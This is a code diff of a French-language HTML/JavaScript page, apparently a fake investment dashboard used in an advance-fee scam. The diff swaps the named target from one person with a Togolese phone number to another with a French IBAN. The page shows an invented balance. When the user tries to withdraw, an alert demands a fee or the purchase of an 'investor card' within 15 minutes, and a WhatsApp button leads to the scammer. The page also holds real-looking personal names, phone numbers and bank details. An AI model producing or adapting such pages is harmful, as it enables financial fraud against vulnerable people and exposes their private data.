@@ -231,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "90298629") {
+        if (code === "FPELFR21XXX") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -245,10 +245,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 16 550 000 F CFA</span>
+                <span class="balance">Solde: 7 500 €</span>
                 <div class="account-info">
-                    <span id="user-name">ADOM AKLESSO</span><br>
-                    <span id="user-phone">+228 90 29 86 29</span>
+                    <span id="user-name">MME TAANLIMI MMADI</span><br>
+                    <span id="user-phone">FR76 1659 8000 0129 2557 5000 140</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -277,7 +277,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via TMoney</button>
+                <button id="orange-money">Retirer via FPE Charenton</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -310,17 +310,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "ADOM AKLESSO";
-                const accountNumber = "+228 90 29 86 29";
-                const balance = "16 550 000 F CFA";
+                const accountName = "MME TAANLIMI MMADI";
+                const accountNumber = "FR76 1659 8000 0129 2557 5000 140";
+                const balance = " 7 500 €";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Tmoney ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via FPE Charenton ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("Tmoney");
+                    setWithdrawalInfo("FPE Charenton");
                 }
             });
 
@@ -332,14 +332,14 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher ADOM, Veuillez effectuer la recharge des 999 999 F CFA afin que le serveur puisse effectuer quelques vérifications.');
+                alert('Cher MMADI, Veuillez acheter votre carte d'\investisseur pour finaliser le processus de transfert des bénéfices dans les 15 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : Frais néccéssaire.';
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
-                window.location.href = "https://wa.me/16263231795";
+                window.location.href = "https://wa.me/+2250574090541";
             });
 
             document.getElementById('logout-button').addEventListener('click', () => {
